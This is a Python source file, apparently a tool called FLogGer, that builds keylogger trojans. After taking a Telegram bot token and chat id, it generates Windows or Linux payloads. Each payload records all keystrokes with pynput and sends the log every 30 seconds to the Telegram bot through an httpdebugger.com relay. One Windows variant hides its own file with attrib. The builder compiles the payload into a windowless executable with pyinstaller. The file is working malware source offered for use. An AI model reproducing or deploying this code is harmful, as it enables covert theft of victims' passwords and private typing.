import os
from colorama import Fore
import time
import platform

filePath = __file__
filePath = list(filePath)
x = 0
arry = ''
while x < len(filePath):
    if filePath[x] == '\\' :
        filePath[x] = '/'
    x+=1
for i in filePath :
    arry += i
filePath = arry.split('/FLogGer.py')

# Variable
targetInfo = platform.uname()
filePath = filePath[0]+'/'
login = '0'
trojanData = {'token': None, 'chatId': None}
payloadName = 'file'

helpMessage = '''
    ╔════════════════════════════════════════════════════════════════════════════════════╗
    ║  -bt     Telgram Bot TOKEN < -bt 1313131313:qwwwet45gdfg3dfhdsdkwsm9mfks9edjdls >  ║
    ║  -ci     Telgram Chat Id < -ci 121212121 >                                         ║
    ║  -np     Set Payload Name, Don't Enter The File Extension(Default Name : file)     ║
    ║  -o      Show option                                                               ║
    ║  -s      Start Compile                                                             ║
    ║  -h      Help                                                                      ║
    ║  -e      Exit                                                                      ║
    ╚════════════════════════════════════════════════════════════════════════════════════╝
'''

# Def
    
def ToExe():
    os.system('pip install pyinstaller')
    print('pyinstaller install')
    os.system(f'cd {filePath}/ && mkdir payload && cd payload && mkdir tmp && dir')
    print(Fore.BLUE+filePath+Fore.RED)
    time.sleep(3)
    os.system(f'pyinstaller --onefile -c --distpath {filePath}/payload --workpath {filePath}/payload/tmp {payloadName}.py -w ')
    open(f'{payloadName}.py', 'w')
    print (Fore.RED+'=====================================================================\n'+Fore.GREEN+'your payload is in '+Fore.RED+f'{filePath}payload/{payloadName}.exe'+Fore.GREEN+' directory'+Fore.RED+'\n=====================================================================')

    


def Compiler():
    compilerMessage = '''
-------------------------------------------------------------------------------------
-w      exe File (windows)
-l      sh File (linux) 
-h      Help
-b      Back
-e      Exit
-------------------------------------------------------------------------------------    
'''
    token = trojanData['token']
    chatId = trojanData['chatId']
    
    if trojanData['token'] == None or trojanData['chatId'] == None:
        print(
            f'bot token set ==> {token}\nchat Id set ==> {chatId}\nFields should not be empty\ntry again\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
        return
    
    
    print(Fore.CYAN+compilerMessage)
    while True:
        workSub = str(input(Fore.RED+'==> '))
        if workSub == '':
            workSub = workSub.split()
            workSub.append('0')
        else:
            workSub = workSub.split()
        
        os.system('cd payload')
        
        if workSub[0] == '-w':
            x = input('Hide After Start y/n? ( default y ) ')
            if x == '':
                x = x.split()
                x.append('y')
            else:
                x = x.split()
            
            file = open(f'{payloadName}.py', 'w')
            if x[0] == 'n' or x[0] == 'N':            
                file.write(
                    f"from pynput import keyboard\nimport time\nimport requests\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
            else :
                file.write(
                    f"import os\nfrom pynput import keyboard\nimport time\nimport requests\npakegaName='{payloadName}.exe'\nfilePathh = __file__\nos.system(f'attrib.exe +s +h {{pakegaName}}')\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
                
            file.close()
            ToExe()
            
        elif workSub[0] == '-l':
            file = open(f'{payloadName}.sh', 'w')
            file.write(
            f"#!/usr/bin/env python\nfrom pynput import keyboard\nimport time\nimport requests\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
            file.close()
            print(Fore.BLUE+f"your file path ==> {filePath}/{payloadName}.sh")
            
        elif workSub[0] == '-h':
            print(Fore.CYAN+compilerMessage)
            
        elif workSub[0] == '-b':
            global login
            login = '0'
            WorkSubmit()
        
        elif workSub[0] == 'e':
            exit()
            
        else :
            print(Fore.RED+'commend not found')
        
        
def WorkSubmit():
    global login
    if login == '0':
        print(Fore.RED+'''
                        _____ _                 ____           
                        |  ___| |    ___   __ _ / ___| ___ _ __ 
                        | |_  | |   / _ \ / _` | |  _ / _ \ '__|
                        |  _| | |__| (_) | (_| | |_| |  __/ |   
                        |_|   |_____\___/ \__, |\____|\___|_|   
                                           |___/                           
'''+Fore.WHITE)
        print(Fore.CYAN+helpMessage)
    else : 
        pass
    login = '1'
    workSub = str(input(Fore.RED+'==> '))
    
    if workSub == '':
        workSub = workSub.split()
        workSub.append('0')
    else:
        workSub = workSub.split()
        
    if len(workSub)==1 and workSub[0] != '-h' and workSub[0] != '-e' and workSub[0] != '-s' and workSub[0] != '-o':
        print('Usage:\n\t< -options command >')
    else:
        if workSub[0] == '-bt':
            trojanData['token'] = workSub[1]
            print(Fore.WHITE+f'bot token set ==> {workSub[1]}')
            workSub[0] == '0'

        elif workSub[0] == '-ci':
            trojanData['chatId'] = workSub[1]
            print(Fore.WHITE+f'chat Id set ==> {workSub[1]}')
            workSub[0] == '0'

        elif workSub[0] == '-np':
            global payloadName
            payloadName = workSub[1]
            print(Fore.WHITE+f'payload name set ==> {workSub[1]}')
            workSub[0] == '0'
        
        elif workSub[0] == '-o' :
            print(Fore.RED+f'=--------------------------------=\n'+Fore.WHITE+f'payload name is : {payloadName}\nbot token is : {trojanData["token"]}\nchat Id is : {trojanData["chatId"]}\n'+Fore.RED+'=--------------------------------='+Fore.WHITE)
            workSub[0] == '0'
            
        elif workSub[0] == '-s':
            Compiler()
            workSub[0] == '0'

        elif workSub[0] == '-h':
            print(Fore.CYAN+helpMessage)
            workSub[0] == '0'

        elif workSub[0] == '-e':
            exit()

        elif workSub[0] == '0':
            pass

        else:
            print(Fore.RED+'commend not found')

while True:
    WorkSubmit()